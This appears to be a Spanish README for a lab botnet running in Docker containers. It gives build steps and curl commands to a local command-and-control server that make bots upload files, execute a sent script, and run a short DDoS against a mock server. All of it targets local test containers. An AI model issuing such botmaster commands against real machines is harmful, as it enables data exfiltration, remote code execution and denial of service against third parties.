## Run
1) make build-all
2) python3 compose-maker.py         //se puede configurar la cantidad de bots
3) make start-all

## Posibles instrucciones del botmaster
- Instruir a los bots a que manden un archivo suyo al server.
```bash
curl -X POST http://localhost:3000/send-command -H "Content-Type: application/json" -d '{"id": 1, "command": "Download", "name": "test1.txt", "filepath": "test_files/test1.txt", "objective": "All"}'
```

- Enviar un ejecutable a los bots y hacer que lo ejecuten.
```bash
curl -X POST http://localhost:3000/send-command -H "Content-Type: application/json" -d '{"id": 1, "command": "Exec", "name": "test1.js", "data": "#!/usr/bin/env node
console.log('Hello world picadita.md'), "objective": "All"}'
```
- Indicarle a todos los bots a hacer DDoS por 2 segundos al mocksv. Para ver el delay que genera en el servidor se puede dejar corriendo el mock-client.py que va logeando el tiempo de respuesta del mock-server.

```bash
curl -X POST http://localhost:3000/send-command -H "Content-Type: application/json" -d '{"id": 1, "command": "DDoS", "ip": "mock-server", "port": 7000, "time": 2, "objective": "All"}'
```

Nota: Los mensajes se pueden dirigir a un subset de los bots en vez de a "All", funcionalidad a mejorar. Por ahora el formato es objective="::ffff:172.28.0.4" con 172.28.0.4 la ip del container.